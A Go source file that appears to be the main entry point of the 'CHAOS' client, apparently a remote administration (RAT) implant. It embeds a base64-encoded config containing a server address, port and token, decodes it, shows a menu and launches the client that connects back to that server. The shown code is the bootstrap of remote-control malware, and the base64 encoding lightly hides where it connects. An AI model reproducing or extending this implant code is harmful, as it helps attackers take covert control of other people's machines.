package main

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"github.com/tiagorlampert/CHAOS/client/app"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/ui"
	"github.com/tiagorlampert/CHAOS/client/app/utils/encode"
)

var (
	Version = "dev"
)

//go:embed config.json
var configFile []byte

type Config struct {
	Port          string `json:"port"`
	ServerAddress string `json:"server_address"`
	Token         string `json:"token"`
}

func main() {
	config, err := readConfigFile(configFile)
	if err != nil {
		panic(err)
	}

	ui.ShowMenu(Version, config.ServerAddress, config.Port)

	app.New(environment.Load(config.ServerAddress, config.Port, config.Token)).Run()
}

func readConfigFile(configFile []byte) (*Config, error) {
	decoded, err := encode.DecodeBase64(bytes.NewBuffer(configFile).String())
	if err != nil {
		panic(err)
	}

	configFile = bytes.NewBufferString(decoded).Bytes()

	var config Config
	return &config, json.Unmarshal(configFile, &config)
}
